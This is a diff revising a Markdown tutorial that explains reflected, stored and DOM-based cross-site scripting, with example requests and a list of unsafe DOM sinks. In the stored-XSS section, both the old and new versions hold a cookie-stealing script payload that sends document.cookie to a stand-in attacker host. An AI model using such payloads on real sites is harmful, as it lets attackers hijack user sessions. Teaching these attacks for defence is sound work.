@@ -1,153 +1,163 @@
-## Types of xss :
+##  Types of XSS
+
 There are **three main types** of Cross-Site Scripting (XSS) attacks:
 
 1. Reflected XSS (Non-Persistent)
 2. Stored XSS (Persistent)
 3. DOM-Based XSS (Client-Side Only)
 
-Each type works differently based on **how the payload is delivered**, **where it is executed**, and **whether the server or the browser is vulnerable**.
+Each type works differently based on:
+
+* **How the payload is delivered**
+* **Where it is executed**
+* **Whether the vulnerability lies in the server or in the browser (DOM)**
 
 ---
 
 ## 1. Reflected XSS (Non-Persistent)
 
-### Description:
+### Description
 
-* The malicious script is **reflected** (bounced back) by the server **immediately** in the response.
-* The input comes from the **HTTP request** (URL, headers, form input) and is used directly in the response without proper sanitization.
-* **Not stored** anywhere on the server.
-* The attack works **only if the victim clicks a crafted link** or is tricked into submitting a malicious request.
+* The payload is reflected **immediately** from the HTTP request back to the response.
+* The server takes input (e.g., from query strings, headers, or form data) and returns it without proper sanitization.
+* The malicious code is **not stored** — it exists only for that session.
+* This attack works only if the **victim is tricked** into clicking a malicious link or submitting a form.
 
-### How it works:
+### How it Works
 
-1. The attacker crafts a malicious URL with a script in the query string or form data.
-2. The victim clicks the link.
-3. The server reflects the script in the response (e.g., in HTML or a message).
-4. The victim’s browser executes the script.
+1. Attacker creates a malicious link with a JavaScript payload in a parameter.
+2. Victim clicks the link.
+3. Server reflects the unsanitized input into the response page.
+4. The browser executes the script in the context of the vulnerable application.
 
-### Example:
+### Example
 
 ```http
 GET /search?q=<script>alert(1)</script> HTTP/1.1
 Host: example.com
 ```
 
-If the server responds with:
+Response:
 
 ```html
 You searched for: <script>alert(1)</script>
 ```
 
-...then the browser executes the alert.
+### Characteristics
 
-### Characteristics:
-
-* Temporary — works only for one request.
-* Requires **user interaction** (click or form submission).
-* Often found in:
+*  **Not stored** on the server
+*  **Requires user interaction** (click or request submission)
+*  **Executed in the browser** (from server reflection)
+*  Common in:
 
   * Search results
-  * Error pages
-  * Form feedback
-  * URL previews
+  * Error messages
+  * Login forms
+  * Redirect URLs
 
 ---
 
 ## 2. Stored XSS (Persistent)
 
-### Description:
+### Description
 
-* The malicious script is **permanently stored** on the server.
-* Usually injected into **databases, comment sections, user profiles, forums, etc.**
-* When other users load the page, the malicious script is served as part of the normal content.
-* This means the attack is **automatically triggered** without any user action.
+* The malicious script is **permanently stored** on the backend (e.g., in a database or file).
+* The script is injected by an attacker and later included in a server response viewed by other users.
+* Victims don’t need to click anything — the attack **triggers automatically** when the page loads.
 
-### How it works:
+### How it Works
 
-1. The attacker submits a script (e.g., in a comment or profile bio).
-2. The application stores the script in its backend (database, file, etc.).
-3. When another user visits that page, the stored script is sent as part of the HTML.
-4. The victim’s browser executes the attacker’s script automatically.
+1. Attacker submits a payload in a comment, message, profile, etc.
+2. The server stores this payload in persistent storage.
+3. When another user views the affected page, the stored script is served as normal content.
+4. The browser executes the script automatically.
 
-### Example:
-
-An attacker posts the following comment:
+### Example
 
 ```html
-Great article! <script>fetch('http://evil.com?cookie=' + document.cookie)</script>
+<script>fetch('https://attacker.com?cookie=' + document.cookie)</script>
 ```
 
-When anyone visits that blog post, their browser executes the script and sends their cookies to the attacker.
+When injected into a comment or profile, this payload will steal cookies from other users.
 
-### Characteristics:
+### Characteristics
 
-* **No user interaction needed** after the initial injection.
-* **High impact**, especially on pages that get viewed by many users (like admin panels).
-* Common in:
+*  **Stored permanently** in the backend
+*  **No interaction needed** by the victim
+*  **Executed in the browser** (as part of normal page load)
+*  **High impact**, especially when exposed to admins or large user bases
+*  Common in:
 
-  * Forums
   * Blog comments
-  * Profile pages
-  * Chat messages
+  * Forums
+  * User profiles
+  * Chat applications
 
 ---
 
 ## 3. DOM-Based XSS
 
-### Description:
+### Description
 
-* The vulnerability exists in **client-side JavaScript**, not the server.
-* The server might be completely innocent — it just delivers a static page.
-* The attack happens when JavaScript on the page **reads untrusted data (from URL, cookies, or input)** and inserts it into the DOM **without proper sanitization or escaping**.
+* The vulnerability lies in **client-side JavaScript**, not in server behavior.
+* JavaScript in the page processes data (e.g., from `location`, `document.URL`, `cookies`) and inserts it into the DOM without sanitization.
+* The browser directly executes the script injected via the DOM.
 
-### How it works:
+### How it Works
 
-1. The attacker creates a URL with a payload in the hash (`#`), query string (`?`), or another client-side source.
-2. The page’s JavaScript reads this value and inserts it into the page using `innerHTML`, `document.write`, etc.
-3. The browser executes the inserted script.
+1. Attacker crafts a URL with a payload in the hash (`#`), query (`?`), or another client-side source.
+2. The JavaScript reads this value and injects it into the page using unsafe DOM manipulation.
+3. The browser executes the injected script.
 
-### Example:
-
-Imagine the site contains this JavaScript:
+### Example
 
 ```javascript
 var name = location.hash.substring(1);
 document.getElementById("output").innerHTML = "Hello " + name;
 ```
 
-Now visit:
+If you visit:
 
 ```
 https://example.com/#<img src=x onerror=alert(1)>
 ```
 
-The result will be:
+Then this renders:
 
 ```html
 Hello <img src=x onerror=alert(1)>
 ```
 
-...which triggers an alert when the image fails to load.
+…and triggers the `alert(1)` execution.
 
-### Characteristics:
+### Characteristics
 
-* **No server involvement** in the injection or execution.
-* Harder to detect because scanning tools may only look at server responses.
-* Very common in modern **JavaScript-heavy applications** (e.g., React, Angular, SPAs).
-* Vulnerable functions include:
+*  **Not stored** anywhere
+*  **Requires a crafted URL or user-controlled DOM data**
+*  **Executed entirely on the frontend (DOM only)**
+*  Often missed by basic vulnerability scanners
+*  Common in Single Page Applications (SPAs) using frameworks like React, Vue, Angular
 
-  * `innerHTML`
-  * `document.write`
-  * `eval`
-  * `setTimeout`/`setInterval` with strings
+### Common Vulnerable Sinks (DOM XSS)
+
+* `element.innerHTML`
+* `element.outerHTML`
+* `document.write()`
+* `document.writeln()`
+* `eval()`
+* `setTimeout("code", ...)` *(string form)*
+* `setInterval("code", ...)` *(string form)*
+* `element.setAttribute(...)`
+* `location.href = untrusted_input`
 
 ---
 
-## Summary
+##  Summary
 
-| Type      | Description                                                                 |
-| --------- | --------------------------------------------------------------------------- |
-| Reflected | Script comes from user input and is reflected back in the same request.     |
-| Stored    | Script is saved in the backend and shown to all users who load the page.    |
-| DOM-Based | Script is injected via the frontend, using JS that handles untrusted input. |
+| Type      | Key Idea                                                                        |
+| --------- | ------------------------------------------------------------------------------- |
+| Reflected | Script is echoed directly from user input to the server response                |
+| Stored    | Script is stored in backend and shown to every user who loads the affected page |
+| DOM-Based | Script is inserted by insecure frontend JavaScript using untrusted client data  |
 
+---
